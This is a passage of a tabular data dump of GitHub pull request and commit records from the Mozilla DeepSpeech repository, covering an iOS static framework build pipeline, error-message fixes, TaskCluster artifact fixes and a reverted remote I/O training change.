I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7b44745b7eed958d65a409476463932ec4a7a19,Add framework to gitignore
256,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1d1ed9c836e5d8e27ba6e8341598b55f94a8cde,Fix podspec version code
257,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63f879b1dcbd3ec0bbaa26a8397b311348b8b0cb,Attempt to fix taskcluster unzip step
258,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11acd178f2fd2660dc6c938252bf231002c74e17,Switch deepspeech targets for iOS build
259,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6dc9a8cee8649132f0a55e29f2dcd4a13bd82e6,Try doing this unzip in one step
260,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcb1781f37dbecb565f28e36daf3ebf7f1fecca9,Remove packaging steps for unneeded stuff because libdeepspeech.so is no longer a thing here. I suppose we could add a step to package the iOS static lib instead.
261,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b910b6903e180828881723a847d771ad58396385,Fix podspec version
262,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9895d3ca0b3f7458705daf57c1e675e1b2fb4f0c,Set up podspec relative assuming a clone from the repo root
263,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e1922ea370c110f9854ae7e97101f2ea00f55c6,Remove space in iOS package step
264,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae2a0a9fc04ae9ce1ebe81342c0391e12de01687,Fix buildfile nit
265,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47c3bf3d81ea3b6239c8d264cbfad5dccf511935,Link stdc++ in explicitly with iOS build only
266,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3436,3436,iOS Static Build Pipeline,"This PR contributes a static build framework build pipeline for iOS, hopefully helping push #3061 along. Credit goes to @xiaoqunSun for pointing me to bazel's `ios_static_framework`.

Build the static framework like this:

```
cd tensorflow

bazel build --verbose_failures --config=ios_arm64 --workspace_status_command=""bash native_client/bazel_workspace_status_cmd.sh"" --apple_bitcode=embedded --copt=-fembed-bitcode --config=monolithic -c opt //native_client:deepspeech_ios --define=runtime=tflite --copt=-DTFLITE_WITH_RUY_GEMV

# Replace .framework folder in Xcode project
rm -rf ../native_client/swift/deepspeech_ios.framework
unzip bazel-bin/native_client/deepspeech_ios.zip
mv deepspeech_ios.framework ../native_client/swift/
```

If you want a smaller bundle and don't care about shipping apps with bitcode to Apple, you can drop the `--apple_bitcode=embedded --copt=-fembed-bitcode` flags.

Then the `xcodebuild` or Xcode app build should work to build a static framework that can be integrated into apps that can be shipped on the iOS App Store or via Testflight.

I tried my best to update the Taskcluster command, but don't want to overpromise.

I also added a basic Podspec which should provide the starting point for turning this into a Cocoa Pod if anyone wants to tackle submitting that somewhere.",CatalinVoss,332459,2020-11-24T03:32:59Z,COLLABORATOR,False,61,18,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31a4eabe91a16498761a39e8a6dccf695c08b6a0,"Revert ""Remove space in iOS package step""

This reverts commit 3e1922ea370c110f9854ae7e97101f2ea00f55c6."
267,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3435,3435,Conditional msg for missing lm.binary added,"The error message for an unreadable lm binary file is misleading. We just had a user [who wanted to build a scorer](https://discourse.mozilla.org/t/error-while-generating-own-scorer/70945/4) with `generate_scorer` and got the message ""Could not read the scorer file."" But he is missing the right lm.binary file. It would therefore be better to state that.

@reuben I changed the output to change the msg in case it the the 
 `DS_ERR_SCORER_UNREADABLE` message. And I haven't been coding C++ for a long time, hope that's fine with you.",olafthiele,30040326,2020-11-23T18:59:51Z,CONTRIBUTOR,True,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ae77ca75d7cb35285205c0ba98dfc066522f3a2,Conditional msg for missing lm.binary added
268,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3434,3434,Changes misleading error message for wrong lm.binary,"The error message for an unreadable lm binary file is misleading. We just had a user [how wanted to build a scorer](https://discourse.mozilla.org/t/error-while-generating-own-scorer/70945/4) with `generate_scorer `and got the message ""Could not read the scorer file."" But he is missing the right lm.binary file. It would therefore be better to state that.

@reuben I am pretty sure,  `lm_load ` always loads the lm binary in the scorer, so I am unsure whether to change the message here or to catch the error and change it on the fly. What do you think?",olafthiele,30040326,2020-11-23T09:53:23Z,CONTRIBUTOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90abb83393053fae8018736cedf070d11cf250eb,Changes misleading error message
269,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3432,3432,Revert remote IO PR,@CatalinVoss FYI,reuben,477142,2020-11-19T14:59:19Z,MEMBER,True,58,203,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5cbda694a30f2b981d4fc83104343dd9fec6954,"Revert ""Merge pull request #3424 from mozilla/io-fixes""

This reverts commit ab1288ffde7118a76e5394e142b789adf3ad1bba, reversing
changes made to 08d18d7328c03eb0c65d28ffdc0d3755549585e0."
270,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3432,3432,Revert remote IO PR,@CatalinVoss FYI,reuben,477142,2020-11-19T14:59:19Z,MEMBER,True,58,203,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88f7297215dbbc16b0109d0d754fa9cbc57247e4,"Revert ""Merge pull request #3420 from CatalinVoss/remote-io""

This reverts commit 08d18d7328c03eb0c65d28ffdc0d3755549585e0, reversing
changes made to 12badcce1ffc820bebc4cd2ed5d9787b248200f6."
271,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3431,3431,Fix #3429: TaskCluster behavioral change wrt compression of artifacts,,lissyx,1645737,2020-11-19T10:55:50Z,COLLABORATOR,True,7,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b65186907fac0c8d8292b76d0b87a0a874bebef6,Fix #3429: TaskCluster behavioral change wrt compression of artifacts
272,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3430,3430,Fix #3429: TaskCluster behavioral change wrt compression of artifacts,,lissyx,1645737,2020-11-19T10:54:49Z,COLLABORATOR,True,7,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3caa474cce484d824a43b87d354319a4d4d4b79a,Fix #3429: TaskCluster behavioral change wrt compression of artifacts
273,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3428,3428,"Importer for XML file provided by Conference Centre for Economics, France",,lissyx,1645737,2020-11-19T09:05:39Z,COLLABORATOR,True,514,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c822a6e8753babe12efba71010d3511a1c3d62a4,"Importer for dataset from Centre de Conférences Pierre Mendès-France

Released by Ministère de l'Economie, des Finances, et de la Relance"
274,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3427,3427,Test older master,,reuben,477142,2020-11-18T19:23:12Z,MEMBER,False,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1cd5e44a52c8ef05879fcc1d1b2334d706d39f37,Force npm install on RTD and set appropriate PATH value
275,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3427,3427,Test older master,,reuben,477142,2020-11-18T19:23:12Z,MEMBER,False,4,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19eeadd0f3770a47c5faa1075bde0243b37e98ff,"Merge pull request #3398 from lissyx/fix-rtd

Force npm install on RTD and set appropriate PATH value"
276,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3425,3425,One more I/O Fix,Fix one more F&R error with unpacking samples leftover from #3424,CatalinVoss,332459,2020-11-18T06:17:25Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba6681cee010e717b4074260e60e7f40d712530e,Fix F&R typo
277,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3425,3425,One more I/O Fix,Fix one more F&R error with unpacking samples leftover from #3424,CatalinVoss,332459,2020-11-18T06:17:25Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1bbbee8d5824aebb9840baa307ff6d1a8a05c1f1,Merge branch 'master' into io-fixes
278,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3424,3424,Fix I/O issues introduced in #3420,This fixes the I/O issues with taskcluster.py introduced in #3420. Also adds a small `.dockerignore` for faster local docker img builds.,CatalinVoss,332459,2020-11-17T21:50:39Z,COLLABORATOR,True,19,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7121ca5a2b1456539034dd115401f39032e9dec0,Add a dockerignore for slightly faster local docker builds
279,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3424,3424,Fix I/O issues introduced in #3420,This fixes the I/O issues with taskcluster.py introduced in #3420. Also adds a small `.dockerignore` for faster local docker img builds.,CatalinVoss,332459,2020-11-17T21:50:39Z,COLLABORATOR,True,19,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffe2155733e257df587d78fd70e10df1c512877b,Undo remote edits for taskcluster as this is all local
280,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3424,3424,Fix I/O issues introduced in #3420,This fixes the I/O issues with taskcluster.py introduced in #3420. Also adds a small `.dockerignore` for faster local docker img builds.,CatalinVoss,332459,2020-11-17T21:50:39Z,COLLABORATOR,True,19,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8bf1e9ddb79bc59225d2f9949f6269f76b4cdddf,Fix too aggressive F&R
281,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3424,3424,Fix I/O issues introduced in #3420,This fixes the I/O issues with taskcluster.py introduced in #3420. Also adds a small `.dockerignore` for faster local docker img builds.,CatalinVoss,332459,2020-11-17T21:50:39Z,COLLABORATOR,True,19,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9aaa0e406bd77969a024aaa8f2e4b9ec031059cf,Make sure to unpack samples now
282,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3424,3424,Fix I/O issues introduced in #3420,This fixes the I/O issues with taskcluster.py introduced in #3420. Also adds a small `.dockerignore` for faster local docker img builds.,CatalinVoss,332459,2020-11-17T21:50:39Z,COLLABORATOR,True,19,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24e9e6777c112373792bd137e591d1bd1d8626bf,Make sure we properly unpack samples when changing audio types
283,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3424,3424,Fix I/O issues introduced in #3420,This fixes the I/O issues with taskcluster.py introduced in #3420. Also adds a small `.dockerignore` for faster local docker img builds.,CatalinVoss,332459,2020-11-17T21:50:39Z,COLLABORATOR,True,19,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6cb638211efc604f1285fd800fa481b1680b7c04,"Only unpack when we need to, to make things work with SDBs"
284,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53e3f5374fad861585d5877823533af7d024dd22,Add I/O helpers for remote file access
285,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,579921cc9250e86e4aee566df8898e10fffad67b,Work remote I/O into train script
286,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

I did this because I wanted to bring in datasets that I have on distributed storage and train on GCP AI platform, but I'd also be curious in your feedback in how you expect this to perform so that I/O doesn't become the bottleneck. It seems like pre-fetching for training is done by `apply_sample_augmentations` with the default value of `process_ahead=2 * batch_size`. Am I following this correctly? For network I/O vs. just having a local SSD with all the data, I might go a little bit higher than that, but even then it seems like the way this is implemented, we could still end up in an I/O-bound situation…",CatalinVoss,332459,2020-11-12T22:50:47Z,COLLABORATOR,True,191,53,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83e5cf0416fdbd51b90ea3aec52042a9374d3c1a,Remote I/O fro check_characters
287,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3420,3420,Remote I/O Training Setup,"Offering this up as a PR in case it's useful to more people than just me.

This refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFIle API, allowing us to pass in files like `gs://my-bucket/my/path` or `hdfs://...`. This can be extended to AWS `s3://...` paths relatively easily.

Most of the refactoring is fairly straightforward. Things get a little bit more complicated with `AudioFile`, since you pass a local file to sox for the conversion. I've just wrapped that into a copy in a tmpfile, since I assume the conversion overhead prevails here and there was a reason for doing things this way.

